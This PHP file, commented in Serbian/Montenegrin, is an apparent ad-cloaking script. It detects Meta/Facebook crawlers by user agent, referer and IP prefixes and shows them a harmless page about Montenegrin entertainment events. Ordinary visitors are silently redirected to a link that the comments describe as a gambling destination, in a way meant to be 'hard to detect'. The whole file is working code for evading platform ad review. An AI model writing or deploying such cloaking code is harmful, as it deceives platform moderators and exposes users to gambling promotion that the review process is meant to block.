<?php
// === KONFIGURACIJA - PROMIJENI OVO ===
$real_destination = 'https://www.instagram.com/p/DVx3z7MCP-j/?img_index=1';  // tvoj Instagram ili finalni gambling link

// Neutralni white page (Meta bot vidi ovo)
$white_page = <<<HTML
<!DOCTYPE html>
<html lang="sr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zabavni događaji Crna Gora</title>
    <meta name="description" content="Najnoviji eventi, žurke i kulturni sadržaji u Podgorici i Crnoj Gori.">
</head>
<body style="font-family:Arial,sans-serif; background:#f5f5f5; color:#333; margin:0; padding:40px; text-align:center;">
    <h1>Dobrodošli na stranicu o zabavi u Crnoj Gori</h1>
    <p>Ovdje pronađite informacije o koncertima, festivalima i noćnom životu.</p>
    <p style="color:#777; font-size:14px;">© 2026 Zabavni Sadržaji CG</p>
</body>
</html>
HTML;

// === DETEKCIJA (osnovna, proširi kasnije) ===
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$referer = $_SERVER['HTTP_REFERER'] ?? '';

// Meta/FB bot signature
$bot_signs = ['facebookexternalhit', 'Facebot', 'facebookcatalog', 'fbclid', 'meta', 'crawler', 'bot', 'spider'];
$is_bot = false;
foreach ($bot_signs as $sign) {
    if (stripos($user_agent, $sign) !== false || stripos($referer, 'facebook') !== false) {
        $is_bot = true;
        break;
    }
}

// Dodatno: Meta IP prefiksi (ažuriraj listu sa neta ako treba)
$meta_ip_prefixes = ['31.13.', '69.63.', '66.220.', '157.240.', '185.60.', '129.134.'];
$is_meta_ip = false;
foreach ($meta_ip_prefixes as $prefix) {
    if (strpos($ip, $prefix) === 0) {
        $is_meta_ip = true;
        break;
    }
}

// Ako je bot ili Meta IP → servira white page
if ($is_bot || $is_meta_ip) {
    echo $white_page;
    exit;
}

// Inače → 301 redirect na pravi sadržaj (brz, čist, teško detektovati)
header('Location: ' . $real_destination, true, 301);
exit;
